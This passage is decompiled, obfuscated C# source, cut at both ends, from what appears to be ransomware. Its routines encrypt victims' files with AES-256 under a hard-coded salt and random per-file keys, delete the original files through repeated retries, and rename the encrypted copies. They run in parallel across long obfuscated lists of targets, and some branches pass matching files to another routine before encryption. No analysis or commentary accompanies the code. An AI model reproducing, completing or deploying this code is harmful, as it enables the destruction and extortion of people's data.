									else if (CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.ToLower().EndsWith(item3) && xhUXlAlyfax == iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107396444))
									{
										try
										{
											VcazhUwaHziY.bQfUCjfaQPg(iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107393739), iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107393734), iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107393753), CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = gXHJYnPwPTXJZrM.QJQnnaFXKLEZHqqtt(32);
						string s = iPvNPprVZgkkcgBs.qDBKGOSTlO(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = kmTsQwtQtSP.NcNnNwTCeGFfUCQ(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024);
						kmTsQwtQtSP.otKhkMkTCKxm(SBpyubiQshOJ: (!jwIpebsbuTtJKU) ? (HHLzNKWftxhcT ? kmTsQwtQtSP.TYTkjjNuoqpT(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : kmTsQwtQtSP.TYTkjjNuoqpT(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (HHLzNKWftxhcT ? aEtMEwYsisfP.GoUQnzNgJTz(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : aEtMEwYsisfP.GoUQnzNgJTz(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), eAyEKDDtpuvhy: CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, zrqCelPaojIsk: bytes);
					}
					else
					{
						string text2 = gXHJYnPwPTXJZrM.QJQnnaFXKLEZHqqtt(32);
						string s2 = iPvNPprVZgkkcgBs.qDBKGOSTlO(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389756))
						{
							if (!aDzhxFxDvB)
							{
								if (!HHLzNKWftxhcT)
								{
									JWhESarpabglUv(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, JkKFSdXHCQ);
								}
								else
								{
									JWhESarpabglUv(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!HHLzNKWftxhcT)
									{
										LNWGGHbYeYwY(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, JkKFSdXHCQ);
									}
									else
									{
										LNWGGHbYeYwY(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (geeOWbkDyamU)
									{
										try
										{
											File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107390547) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + iOicLYfXayCEbJ.getString_0(107389774) + ex6.Message + iOicLYfXayCEbJ.getString_0(107396290));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!aDzhxFxDvB)
						{
							if (!HHLzNKWftxhcT)
							{
								JWhESarpabglUv(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + iOicLYfXayCEbJ.getString_0(107389783), JkKFSdXHCQ);
							}
							else
							{
								JWhESarpabglUv(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + iOicLYfXayCEbJ.getString_0(107389783), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!HHLzNKWftxhcT)
								{
									LNWGGHbYeYwY(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, JkKFSdXHCQ);
								}
								else
								{
									LNWGGHbYeYwY(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (geeOWbkDyamU)
								{
									try
									{
										File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107390547) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + iOicLYfXayCEbJ.getString_0(107389774) + ex8.Message + iOicLYfXayCEbJ.getString_0(107396290));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (HHLzNKWftxhcT)
						{
							if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389756))
							{
								oDYBJqpCnUcVu(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, bytes2);
							}
							else
							{
								oDYBJqpCnUcVu(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			CS_0024_003C_003E8__locals0.sgLbAoBHxjjEl.Remove(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
		});
	}

	private static void ADZDqnebhNRT(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (pXuFbktiBaug == getString_0(107396964))
					{
						foreach (string item in eiWezuyCGKD)
						{
							if (string_0.ToLower().EndsWith(item) && xhUXlAlyfax == getString_0(107396964))
							{
								if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										VcazhUwaHziY.bQfUCjfaQPg(getString_0(107393716), getString_0(107393711), getString_0(107393730), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && xhUXlAlyfax == getString_0(107396421))
							{
								try
								{
									VcazhUwaHziY.bQfUCjfaQPg(getString_0(107393716), getString_0(107393711), getString_0(107393730), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107389766)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107389766), getString_0(107393667)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void LNWGGHbYeYwY(string string_0, string string_1, byte[] byte_0)
	{
		if (pXuFbktiBaug == getString_0(107396964))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in eiWezuyCGKD)
			{
				if (string_0.ToLower().EndsWith(item) && xhUXlAlyfax == getString_0(107396964))
				{
					if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							VcazhUwaHziY.bQfUCjfaQPg(getString_0(107393716), getString_0(107393711), getString_0(107393730), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && xhUXlAlyfax == getString_0(107396421))
				{
					try
					{
						VcazhUwaHziY.bQfUCjfaQPg(getString_0(107393716), getString_0(107393711), getString_0(107393730), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = aEtMEwYsisfP.GoUQnzNgJTz(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
		}
	}

	private static void JWhESarpabglUv(string string_0, string string_1, byte[] byte_0)
	{
		fDwEtSuXSxJBuR CS_0024_003C_003E8__locals0 = new fDwEtSuXSxJBuR();
		CS_0024_003C_003E8__locals0.WqSRVcNJKBpb = string_0;
		CS_0024_003C_003E8__locals0.olhyjfhvpIWUIA = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string olhyjfhvpIWUIA = CS_0024_003C_003E8__locals0.olhyjfhvpIWUIA;
			FileStream fileStream = new FileStream(olhyjfhvpIWUIA, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (lAmPIwcPEjNhXG == getString_0(107396964))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.WqSRVcNJKBpb, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.WqSRVcNJKBpb, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.WqSRVcNJKBpb, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.olhyjfhvpIWUIA.Length > 0)
				{
					if (pXuFbktiBaug == getString_0(107396964))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.WqSRVcNJKBpb, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in eiWezuyCGKD)
						{
							if (CS_0024_003C_003E8__locals0.WqSRVcNJKBpb.ToLower().EndsWith(item) && xhUXlAlyfax == getString_0(107396964))
							{
								if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										VcazhUwaHziY.bQfUCjfaQPg(getString_0(107393716), getString_0(107393711), getString_0(107393730), CS_0024_003C_003E8__locals0.WqSRVcNJKBpb);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.WqSRVcNJKBpb.ToLower().EndsWith(item) && xhUXlAlyfax == getString_0(107396421))
							{
								try
								{
									VcazhUwaHziY.bQfUCjfaQPg(getString_0(107393716), getString_0(107393711), getString_0(107393730), CS_0024_003C_003E8__locals0.WqSRVcNJKBpb);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.WqSRVcNJKBpb);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.olhyjfhvpIWUIA.EndsWith(getString_0(107389766)))
					{
						File.Move(CS_0024_003C_003E8__locals0.olhyjfhvpIWUIA, CS_0024_003C_003E8__locals0.olhyjfhvpIWUIA.Replace(getString_0(107389766), getString_0(107393667)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.olhyjfhvpIWUIA))
							{
								File.Delete(CS_0024_003C_003E8__locals0.olhyjfhvpIWUIA);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (geeOWbkDyamU)
			{
				try
				{
					File.AppendAllText(UvHPjcAlchtwE, getString_0(107390530) + CS_0024_003C_003E8__locals0.WqSRVcNJKBpb + getString_0(107389757) + ex2.Message + getString_0(107396273));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> mUKeFWwqRbsUt = MUKeFWwqRbsUt;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				dgFtyqbndoER(getString_0(107389704), string_0);
			};
		}
		Parallel.ForEach(mUKeFWwqRbsUt, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> uitWgaprnpOe = UitWgaprnpOe;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				dgFtyqbndoER(getString_0(107392784), string_0);
			};
		}
		Parallel.ForEach(uitWgaprnpOe, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		List<string> qxnFKMJGHHM = QxnFKMJGHHM;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107389695)), string_0);
			};
		}
		Parallel.ForEach(qxnFKMJGHHM, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		if (OVsecWAEVkGcGjJDv == getString_0(107396964))
		{
			string[] kRkKkskNZSstTnnF = KRkKkskNZSstTnnF;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107389695)), getString_0(107389670) + string_0 + getString_0(107389661));
				};
			}
			Parallel.ForEach(kRkKkskNZSstTnnF, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		if (!pgBFtwVZlq().Contains(getString_0(107390396)))
		{
			jtJLvUlPurQHRX(yaObxwDYeQoq);
		}
		else
		{
			List<string> source = tYFycaveyEZlTZa;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
				{
					dgFtyqbndoER(tjPFETNBnBMzUXk(UdOhEiscoVO(getString_0(107389624))), string_0);
				};
			}
			Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		}
		List<string> dZKPMstogvMqutY = DZKPMstogvMqutY;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107389631)), string_0);
			};
		}
		Parallel.ForEach(dZKPMstogvMqutY, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		List<string> source2 = jGCPbbWylwhkiZ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
			{
				dgFtyqbndoER(getString_0(107389582), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		dgFtyqbndoER(getString_0(107389704), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		dgFtyqbndoER(getString_0(107392784), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107389695)), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107389695)), getString_0(107389670) + string_0 + getString_0(107389661));
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		dgFtyqbndoER(tjPFETNBnBMzUXk(UdOhEiscoVO(getString_0(107389624))), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		dgFtyqbndoER(tjPFETNBnBMzUXk(getString_0(107389631)), string_0);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		dgFtyqbndoER(getString_0(107389582), string_0);
	}

	static arFNxqUpEFyGtTT()
	{
		Strings.CreateGetStringDelegate(typeof(arFNxqUpEFyGtTT));
		XTNtJjAvASbm = getString_0(107394091);
		JkKFSdXHCQ = null;
		cIxqzYzUXVduz = getString_0(107396421);
		VQcuZcdUECpj = getString_0(107389605);
		PelwIoYLMluwkT = new List<string>();
		NlUoosbgDN = new List<string>();
		aNVPohsbWbid = getString_0(107396421);
		OFTUyyIDOSKVU = getString_0(107393667);
		WFhUCfopZvgdKa = getString_0(107393667);
		iWUecWvWvdy = getString_0(107396421);
		aSuWOKqpTFWLZt = 0;
		NjvrgrwIrOwQYj = getString_0(107396421);
		VpJGOcUaTwfpij = getString_0(107396421);
		mqeQDptBukI = getString_0(107396421);
		hYdMzWyQBJgl = getString_0(107389560);
		dqMjwzdylpdLK = getString_0(107396964);
		KpXSYjCAPyvtw = getString_0(107396421);
		ihApggwfGvkG = getString_0(107396421);
		SotcHURFSsO = getString_0(107396421);
		pjYhYVVkRFVa = new List<string>
		{
			tjPFETNBnBMzUXk(getString_0(107389555)),
			tjPFETNBnBMzUXk(getString_0(107389570)),
			tjPFETNBnBMzUXk(getString_0(107390025)),
			tjPFETNBnBMzUXk(getString_0(107390008)),
			tjPFETNBnBMzUXk(getString_0(107390015)),
			tjPFETNBnBMzUXk(getString_0(107389990)),
			tjPFETNBnBMzUXk(getString_0(107389941)),
			tjPFETNBnBMzUXk(getString_0(107389948)),
			tjPFETNBnBMzUXk(getString_0(107389923)),
			tjPFETNBnBMzUXk(getString_0(107389866)),
			tjPFETNBnBMzUXk(getString_0(107389881)),
			tjPFETNBnBMzUXk(getString_0(107389856)),
			tjPFETNBnBMzUXk(getString_0(107389831))
		};
		PYEHnBxJBpISsEZ = new List<string>();
		MblmlkeceAY = getString_0(107396964);
		FJXsFcPZKBWlNn = getString_0(107396421);
		oVErvisfbdnQp = getString_0(107396421);
		mfvCVNdCLAD = new List<string>();
		WdQFHfcExMiYlnK = getString_0(107396421);
		AtNcgpYdstMFwdNy = getString_0(107389262);
		HpbWCpkqwlpVpmb = getString_0(107396421);
		eKcpSjrBmJYP = getString_0(107396421);
		UitWgaprnpOe = new List<string>
		{
			tjPFETNBnBMzUXk(getString_0(107389245)),
			tjPFETNBnBMzUXk(getString_0(107389212)),
			tjPFETNBnBMzUXk(getString_0(107389179)),
			tjPFETNBnBMzUXk(getString_0(107389146)),
			tjPFETNBnBMzUXk(getString_0(107389113)),
			tjPFETNBnBMzUXk(getString_0(107389084)),
			tjPFETNBnBMzUXk(getString_0(107389539)),
			tjPFETNBnBMzUXk(getString_0(107389510)),
			tjPFETNBnBMzUXk(getString_0(107389465)),
			tjPFETNBnBMzUXk(getString_0(107389368)),
			tjPFETNBnBMzUXk(getString_0(107389335)),
			tjPFETNBnBMzUXk(getString_0(107389302)),
			tjPFETNBnBMzUXk(getString_0(107388757)),
			tjPFETNBnBMzUXk(getString_0(107388728)),
			tjPFETNBnBMzUXk(getString_0(107388731)),
			tjPFETNBnBMzUXk(getString_0(107388658)),
			tjPFETNBnBMzUXk(getString_0(107388617)),
			tjPFETNBnBMzUXk(getString_0(107388560)),
			tjPFETNBnBMzUXk(getString_0(107388543)),
			tjPFETNBnBMzUXk(getString_0(107389022)),
			tjPFETNBnBMzUXk(getString_0(107388993)),
			tjPFETNBnBMzUXk(getString_0(107388920)),
			tjPFETNBnBMzUXk(getString_0(107388879)),
			tjPFETNBnBMzUXk(getString_0(107388846)),
			tjPFETNBnBMzUXk(getString_0(107388829)),
			tjPFETNBnBMzUXk(getString_0(107388260)),
			tjPFETNBnBMzUXk(getString_0(107388219)),
			tjPFETNBnBMzUXk(getString_0(107388190)),
			tjPFETNBnBMzUXk(getString_0(107388117)),
			tjPFETNBnBMzUXk(getString_0(107388092)),
			tjPFETNBnBMzUXk(getString_0(107388027)),
			tjPFETNBnBMzUXk(getString_0(107388482)),
			tjPFETNBnBMzUXk(getString_0(107388417)),
			tjPFETNBnBMzUXk(getString_0(107388336)),
			tjPFETNBnBMzUXk(getString_0(107388271)),
			tjPFETNBnBMzUXk(getString_0(107387702)),
			tjPFETNBnBMzUXk(getString_0(107387669)),
			tjPFETNBnBMzUXk(getString_0(107387628)),
			tjPFETNBnBMzUXk(getString_0(107387619)),
			tjPFETNBnBMzUXk(getString_0(107387542)),
			tjPFETNBnBMzUXk(getString_0(107387545)),
			tjPFETNBnBMzUXk(getString_0(107387960)),
			tjPFETNBnBMzUXk(getString_0(107387919)),
			tjPFETNBnBMzUXk(getString_0(107387886)),
			tjPFETNBnBMzUXk(getString_0(107387877)),
			tjPFETNBnBMzUXk(getString_0(107387796)),
			tjPFETNBnBMzUXk(getString_0(107387783)),
			tjPFETNBnBMzUXk(getString_0(107387198)),
			tjPFETNBnBMzUXk(getString_0(107387121)),
			tjPFETNBnBMzUXk(getString_0(107387108)),
			tjPFETNBnBMzUXk(getString_0(107387031)),
			tjPFETNBnBMzUXk(getString_0(107386990)),
			tjPFETNBnBMzUXk(getString_0(107387461)),
			tjPFETNBnBMzUXk(getString_0(107387432)),
			tjPFETNBnBMzUXk(getString_0(107387391)),
			tjPFETNBnBMzUXk(getString_0(107387326)),
			tjPFETNBnBMzUXk(getString_0(107387249)),
			tjPFETNBnBMzUXk(getString_0(107386708)),
			tjPFETNBnBMzUXk(getString_0(107386695)),
			tjPFETNBnBMzUXk(getString_0(107386630)),
			tjPFETNBnBMzUXk(getString_0(107386569)),
			tjPFETNBnBMzUXk(getString_0(107386512)),
			tjPFETNBnBMzUXk(getString_0(107386959)),
			tjPFETNBnBMzUXk(getString_0(107386950)),
			tjPFETNBnBMzUXk(getString_0(107386889)),
			tjPFETNBnBMzUXk(getString_0(107386880)),
			tjPFETNBnBMzUXk(getString_0(107386767)),
			tjPFETNBnBMzUXk(getString_0(107386194)),
			tjPFETNBnBMzUXk(getString_0(107386121)),
			tjPFETNBnBMzUXk(getString_0(107386108)),
			tjPFETNBnBMzUXk(getString_0(107386075)),
			tjPFETNBnBMzUXk(getString_0(107386002)),
			tjPFETNBnBMzUXk(getString_0(107386469)),
			tjPFETNBnBMzUXk(getString_0(107386392)),
			tjPFETNBnBMzUXk(getString_0(107386335)),
			tjPFETNBnBMzUXk(getString_0(107386254)),
			tjPFETNBnBMzUXk(getString_0(107386225)),
			tjPFETNBnBMzUXk(getString_0(107385704)),
			tjPFETNBnBMzUXk(getString_0(107385639)),
			tjPFETNBnBMzUXk(getString_0(107385558)),
			tjPFETNBnBMzUXk(getString_0(107385533)),
			tjPFETNBnBMzUXk(getString_0(107385500)),
			tjPFETNBnBMzUXk(getString_0(107385951)),
			tjPFETNBnBMzUXk(getString_0(107385894)),
			tjPFETNBnBMzUXk(getString_0(107387702)),
			tjPFETNBnBMzUXk(getString_0(107385805)),
			tjPFETNBnBMzUXk(getString_0(107385796)),
			tjPFETNBnBMzUXk(getString_0(107385163)),
			tjPFETNBnBMzUXk(getString_0(107385150)),
			tjPFETNBnBMzUXk(getString_0(107385089)),
			tjPFETNBnBMzUXk(getString_0(107385064)),
			tjPFETNBnBMzUXk(getString_0(107385019)),
			tjPFETNBnBMzUXk(getString_0(107384938)),
			tjPFETNBnBMzUXk(getString_0(107388092)),
			tjPFETNBnBMzUXk(getString_0(107385385)),
			tjPFETNBnBMzUXk(getString_0(107385376)),
			tjPFETNBnBMzUXk(getString_0(107385319)),
			tjPFETNBnBMzUXk(getString_0(107388027)),
			tjPFETNBnBMzUXk(getString_0(107385246)),
			tjPFETNBnBMzUXk(getString_0(107384653)),
			tjPFETNBnBMzUXk(getString_0(107384564)),
			tjPFETNBnBMzUXk(getString_0(107384499)),
			tjPFETNBnBMzUXk(getString_0(107384482)),
			tjPFETNBnBMzUXk(getString_0(107388417)),
			tjPFETNBnBMzUXk(getString_0(107384885)),
			tjPFETNBnBMzUXk(getString_0(107387669)),
			tjPFETNBnBMzUXk(getString_0(107388336)),
			tjPFETNBnBMzUXk(getString_0(107384852)),
			tjPFETNBnBMzUXk(getString_0(107384827)),
			tjPFETNBnBMzUXk(getString_0(107388271)),
			tjPFETNBnBMzUXk(getString_0(107384794)),
			tjPFETNBnBMzUXk(getString_0(107384713)),
			tjPFETNBnBMzUXk(getString_0(107384152)),
			tjPFETNBnBMzUXk(getString_0(107388117)),
			tjPFETNBnBMzUXk(getString_0(107384159)),
			tjPFETNBnBMzUXk(getString_0(107384082)),
			tjPFETNBnBMzUXk(getString_0(107384053)),
			tjPFETNBnBMzUXk(getString_0(107384024)),
			tjPFETNBnBMzUXk(getString_0(107383979)),
			tjPFETNBnBMzUXk(getString_0(107383946)),
			tjPFETNBnBMzUXk(getString_0(107383921)),
			tjPFETNBnBMzUXk(getString_0(107384420)),
			tjPFETNBnBMzUXk(getString_0(107384363)),
			tjPFETNBnBMzUXk(getString_0(107384354)),
			tjPFETNBnBMzUXk(getString_0(107384277)),
			tjPFETNBnBMzUXk(getString_0(107384260)),
			tjPFETNBnBMzUXk(getString_0(107384171)),
			tjPFETNBnBMzUXk(getString_0(107383626)),
			tjPFETNBnBMzUXk(getString_0(107383613)),
			tjPFETNBnBMzUXk(getString_0(107383580)),
			tjPFETNBnBMzUXk(getString_0(107383507)),
			tjPFETNBnBMzUXk(getString_0(107388190)),
			tjPFETNBnBMzUXk(getString_0(107384260)),
			tjPFETNBnBMzUXk(getString_0(107383466)),
			tjPFETNBnBMzUXk(getString_0(107383437)),
			tjPFETNBnBMzUXk(getString_0(107383408)),
			tjPFETNBnBMzUXk(getString_0(107383903)),
			tjPFETNBnBMzUXk(getString_0(107383830)),
			tjPFETNBnBMzUXk(getString_0(107383801)),
			tjPFETNBnBMzUXk(getString_0(107383696)),
			tjPFETNBnBMzUXk(getString_0(107383667)),
			tjPFETNBnBMzUXk(getString_0(107383122)),
			tjPFETNBnBMzUXk(getString_0(107383049)),
			tjPFETNBnBMzUXk(getString_0(107383020)),
			tjPFETNBnBMzUXk(getString_0(107383007)),
			tjPFETNBnBMzUXk(getString_0(107382942)),
			tjPFETNBnBMzUXk(getString_0(107382909)),
			tjPFETNBnBMzUXk(getString_0(107383344)),
			tjPFETNBnBMzUXk(getString_0(107383283)),
			tjPFETNBnBMzUXk(getString_0(107383250)),
			tjPFETNBnBMzUXk(getString_0(107383237)),
			tjPFETNBnBMzUXk(getString_0(107383172)),
			tjPFETNBnBMzUXk(getString_0(107382627)),
			tjPFETNBnBMzUXk(getString_0(107382586)),
			tjPFETNBnBMzUXk(getString_0(107382505)),
			tjPFETNBnBMzUXk(getString_0(107388829)),
			tjPFETNBnBMzUXk(getString_0(107382476)),
